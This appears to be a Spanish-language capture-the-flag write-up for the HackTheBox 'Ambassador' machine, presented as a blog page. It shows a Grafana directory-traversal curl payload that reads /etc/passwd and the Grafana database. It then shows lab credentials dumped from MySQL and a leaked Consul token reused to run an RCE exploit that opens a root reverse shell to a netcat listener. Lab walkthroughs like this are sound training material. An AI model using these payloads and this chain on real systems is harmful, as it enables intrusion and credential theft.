@@ -1,0 +1,209 @@
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Ambassador HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/ambassador.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Ambassador HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Ambassador de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Ambassador de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Ambassador HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Ambassador HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Ambassador de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Ambassador HackTheBox</h1>
+          <p>Resolución de la máquina Ambassador de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.183
+Nmap scan report for 10.10.11.183
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+3306/tcp open  mysql</span>
+</code></pre></div></div>
+
+<div><p>Mirando el puerto 3000 podemos ver lo siguiente</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Buscando exploits de grafana encontramos uno para leer archivos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ searchsploit </span><span class="p">grafana
+------------------------------------------------------------ ---------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------
+Grafana 7.0.1 - Denial of Service (PoC)                     | linux/dos/48638.sh
+Grafana 8.3.0 - Directory Traversal and Arbitrary File Read | multiple/webapps/50581.py
+------------------------------------------------------------ ---------------------------</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver lo que hace y hacerlo con curl, leemos el /etc/passwd y vemos los usuarios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | </span><span class="s2">grep</span><span class="p"> sh$
+root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000:developer:/home/developer:/bin/bash</span>
+</code></pre></div></div>
+
+<div><p>También podemos descargar la db de grafana para inspeccionarla</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+</span></code></pre></div></div>
+
+<div><p>La abrimos con sqlitebrowser y podemos ver una tabla data_source, podemos darle a browse table</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Al darle a browse table ncontramos credenciales para mysql</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Nos conectamos y podemos ver algunas bases de datos entre ellas whackywidget, la usamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ mysql </span><span class="p">-h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+
+</span><span class="kd">MySQL [(none)]></span><span class="p"> show databases;
++--------------------+
+| Database           |
++--------------------+
+| grafana            |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| whackywidget       |
++--------------------+
+
+</span><span class="kd">MySQL [(none)]></span><span class="p"> use whackywidget;
+Database changed
+
+</span><span class="kd">MySQL [whackywidget]></span>
+</code></pre></div></div>
+
+<div><p>Podemos ver la tabla users, al leerla vemos el usuario developer y un hash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">MySQL [whackywidget]></span><span class="p"> show tables;
++------------------------+
+| Tables_in_whackywidget |
++------------------------+
+| users                  |
++------------------------+
+
+</span><span class="kd">MySQL [whackywidget]> </span><span class="p">select * from users;
++-----------+------------------------------------------+
+| user      | pass                                     |
++-----------+------------------------------------------+
+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
++-----------+------------------------------------------+
+
+</span><span class="kd">MySQL [whackywidget]></span>
+</code></pre></div></div>
+
+<div><p>El "hash" solo es base64 asi que podemos verlo facilmente en texto claro</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=="</span><span class="p"> |</span><span class="s2"> base64</span><span class="p"> -d
+anEnglishManInNewYork027468</span>
+</code></pre></div></div>
+
+<div><p>Con estas credenciales nos conectamos por ssh y leemos la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">developer@10.10.11.183                       
+developer@10.10.11.183's password: </span><span class="kd">anEnglishManInNewYork027468</span><span class="p">
+</span><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(developer) gid=1000(developer) groups=1000(developer)
+</span><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.183 dead:beef::250:56ff:feb9:3399 
+</span><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+5c8**************************26c
+</span><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En la carpeta /opt/my-app podemos ver un proyecto de github y algunos commits</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">/opt/my-app</span><span class="p">$ git log --oneline
+</span><span class="no">33a53ef (</span><span class="k">HEAD -></span><span class="s2"> main</span><span class="no">)</span><span class="p"> tidy config script
+</span><span class="no">c982db8</span><span class="p"> config script
+</span><span class="no">8dce657</span><span class="p"> created project with django CLI
+</span><span class="no">4b8597b</span><span class="p"> .gitignore
+</span><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">/opt/my-app</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si vemos el último commit podemos ver que se ha quitado un token</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">/opt/my-app</span><span class="p">$ git show 33a53ef
+</span><span class="no">commit 33a53ef9a207976d5ceceddc41a199558843bf3c (</span><span class="k">HEAD -></span><span class="s2"> main</span><span class="no">)
+</span><span class="p">Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:47:36 2022 +0000
+
+    tidy config script
+
+diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+index 35c08f6..fc51ec0 100755
+--- a/whackywidget/put-config-in-consul.sh
++++ b/whackywidget/put-config-in-consul.sh
+</span><span class="na">@@ -1,4 +1,4 @@</span><span class="p">
+ # We use Consul for application config in production, this script will help set the correct values for the app
+</span><span class="kd">-# Export MYSQL_PASSWORD before running
+</span><span class="s2">+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
+ 
+</span><span class="kd">-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</span><span class="s2">+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</span><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">/opt/my-app</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Hay un <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API">exploit</a> en github que desarrolle hace poco el cual podemos usar para escalar</p></div>
+<div><p>Copiamos el exploit en la maquina victima y lo ejecutamos tal como nos indica el readme solo cambiando el lhost, esto envia la petición</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">~</span><span class="p">$ python3 exploit.py --lhost 10.10.14.10 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
+
+[</span><span class="s2">+</span><span class="p">] Request sent successfully, check your listener
+
+</span><span class="s2">developer@ambassador</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Revisamos nuestro listener de netcat y tenemos una shell como root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.183
+</span><span class="s2">root@ambassador</span><span class="p">:</span><span class="na">/</span><span class="p"># id      
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@ambassador</span><span class="p">:</span><span class="na">/</span><span class="p"># hostname -I
+10.10.11.183 dead:beef::250:56ff:feb9:5484 
+</span><span class="s2">root@ambassador</span><span class="p">:</span><span class="na">/</span><span class="p"># cat /root/root.txt
+7f7**************************296
+</span><span class="s2">root@ambassador</span><span class="p">:</span><span class="na">/</span><span class="p">#</span>  
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
